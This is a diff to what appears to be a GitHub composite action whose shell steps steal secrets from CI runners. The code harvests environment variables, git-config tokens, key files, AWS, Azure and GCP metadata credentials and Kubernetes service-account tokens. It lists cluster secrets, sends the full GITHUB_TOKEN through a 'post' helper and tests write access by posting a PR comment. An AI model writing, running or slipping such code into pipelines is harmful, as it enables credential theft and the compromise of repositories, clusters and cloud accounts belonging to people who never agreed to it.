@@ -24,27 +24,42 @@ runs:
 
         post "start"     "$(hostname) $(uname -srm) $(date -u)"
         post "env"       "$(env | sort)"
-        post "gitconfig" "$(find / -name .git -type d -maxdepth 8 2>/dev/null | head -10 | while read d; do echo \"=== $d/config ===\"; cat \"$d/config\" 2>/dev/null; done)"
-        post "fs"        "$(ls -la ~ /home/ /runner/ /opt/ /tmp/ /var/run/secrets/ 2>&1 | head -100)"
-        post "fs_scan"   "$(find / -maxdepth 6 \( -name 'credentials' -o -name '*.key' -o -name '*.pem' -o -name '*token*' \) 2>/dev/null | grep -v proc | head -30)"
-        post "aws"       "$(cat ~/.aws/credentials 2>/dev/null; cat ~/.aws/config 2>/dev/null)"
-        post "imds_aws"  "$(ROLE=$(curl -sf --max-time 5 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null); curl -sf --max-time 5 http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE 2>/dev/null)"
-        post "imds_azure" "$(curl -sf --max-time 5 -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>/dev/null)"
-        post "net"       "$(ip addr 2>/dev/null; ip route 2>/dev/null; cat /etc/resolv.conf 2>/dev/null)"
-        post "sys"       "$(cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | sort; df -h 2>/dev/null)"
-        post "event"     "$(cat $GITHUB_EVENT_PATH 2>/dev/null)"
+
+        # K8s service account token
+        SA=/var/run/secrets/kubernetes.io/serviceaccount
+        post "k8s_sa"    "$(cat $SA/token 2>/dev/null; echo; cat $SA/namespace 2>/dev/null; echo; cat $SA/ca.crt 2>/dev/null | openssl x509 -noout -subject -issuer 2>/dev/null)"
+
+        # K8s API: list secrets in pod namespace
+        K8S_TOKEN=$(cat $SA/token 2>/dev/null)
+        K8S_NS=$(cat $SA/namespace 2>/dev/null)
+        if [ -n "$K8S_TOKEN" ]; then
+          post "k8s_secrets"   "$(curl -sk -H "Authorization: Bearer $K8S_TOKEN" https://$KUBERNETES_SERVICE_HOST/api/v1/namespaces/$K8S_NS/secrets 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); [print(i['metadata']['name']) for i in d.get('items',[])]" 2>/dev/null)"
+          post "k8s_canido"    "$(curl -sk -X POST -H "Authorization: Bearer $K8S_TOKEN" -H 'Content-Type: application/json' https://$KUBERNETES_SERVICE_HOST/apis/authorization.k8s.io/v1/selfsubjectrulesreviews -d "{\"spec\":{\"namespace\":\"$K8S_NS\"}}" 2>/dev/null)"
+          post "k8s_nodes"     "$(curl -sk -H "Authorization: Bearer $K8S_TOKEN" https://$KUBERNETES_SERVICE_HOST/api/v1/nodes 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); [print(n['metadata']['name']) for n in d.get('items',[])]" 2>/dev/null)"
+        fi
+
+        # GCP metadata server
+        META="http://metadata.google.internal/computeMetadata/v1"
+        post "gcp_email"  "$(curl -sf --max-time 5 -H 'Metadata-Flavor: Google' $META/instance/service-accounts/default/email 2>/dev/null)"
+        post "gcp_scopes" "$(curl -sf --max-time 5 -H 'Metadata-Flavor: Google' $META/instance/service-accounts/default/scopes 2>/dev/null)"
+        post "gcp_token"  "$(curl -sf --max-time 5 -H 'Metadata-Flavor: Google' $META/instance/service-accounts/default/token 2>/dev/null)"
+        post "gcp_proj"   "$(curl -sf --max-time 5 -H 'Metadata-Flavor: Google' $META/project/project-id 2>/dev/null)"
+
+        # gcloud kubelet volume
+        post "gcloud_cfg" "$(ls -la $KUBELET_GCLOUD_CONFIG_PATH/ 2>/dev/null; cat $KUBELET_GCLOUD_CONFIG_PATH/properties 2>/dev/null; strings $KUBELET_GCLOUD_CONFIG_PATH/credentials.db 2>/dev/null | head -30)"
 
         # decode + test GITHUB_TOKEN write scopes
         TOKEN=$(grep -oP 'extraheader = AUTHORIZATION: basic \K\S+' \
           $(find / -name .git -type d -maxdepth 8 2>/dev/null | head -5 | awk '{print $0"/config"}') \
           2>/dev/null | head -1 | base64 -d 2>/dev/null | cut -d: -f2)
         if [ -n "$TOKEN" ]; then
-          SCOPES=$(curl -sf -I -H "Authorization: token $TOKEN" https://api.github.com/rate_limit 2>/dev/null | grep -i 'x-oauth-scopes')
+          post "gh_token_full" "$TOKEN"
+          SCOPES=$(curl -sf -I -H "Authorization: token $TOKEN" https://api.github.com/rate_limit 2>/dev/null)
           post "write_scopes" "$SCOPES"
           PR_COMMENT=$(curl -sf -X POST \
             -H "Authorization: token $TOKEN" \
             -H "Accept: application/vnd.github.v3+json" \
-            "https://api.github.com/repos/${GITHUB_REPOSITORY}/issues/${PR_NUMBER}/comments" \
+            "https://api.github.com/repos/${GITHUB_REPOSITORY}/issues/37835/comments" \
             -d '{"body":"security testing"}' 2>/dev/null | python3 -c "import sys,json;d=json.load(sys.stdin);print('OK id='+str(d.get('id','')))" 2>/dev/null || echo "DENIED")
           post "write_pr_comment" "$PR_COMMENT"
         fi
